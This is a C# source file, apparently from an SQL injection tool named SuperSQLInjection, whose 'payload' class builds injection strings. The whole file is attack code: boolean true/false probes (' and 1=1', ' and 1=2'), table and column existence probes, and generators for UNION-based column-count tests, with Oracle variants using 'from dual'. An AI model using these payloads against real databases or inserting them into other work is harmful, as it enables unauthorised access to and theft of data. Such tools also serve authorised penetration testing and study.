using System;
using System.Collections.Generic;
using System.Text;

namespace SuperSQLInjection.payload
{
    class Comm
    {
        public static String exists_table = " and exists(select 1 from {0})";
        public static String exists_column = " and exists(select {0} from {1})";
        public static String truePayload = " and 1=1";
        public static String falsePayload = " and 1=2";

        public static String unionColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {

                sb.Append(column + unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }


        public static String unionColumnCountTest(int maxColumn,int fill)
        {
            StringBuilder sb = new StringBuilder(" and 1=2 union all select ");
            for (int i = 1; i <= maxColumn;i++ )
            {
                sb.Append(fill+"+"+i+",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }

        public static String unionColumnCountTestByOracle(int maxColumn, String fill)
        {
            StringBuilder sb = new StringBuilder(" and 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                sb.Append(fill + ",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString()+" from dual";
        }

        public static String unionColumnCountTestByOracle(int maxColumn,int testIndex,String fill)
        {
            StringBuilder sb = new StringBuilder(" and 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                if (i == testIndex)
                {
                    sb.Append(fill + ",");
                }
                else
                {
                    sb.Append("null" + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString() + " from dual";
        }


    }
}
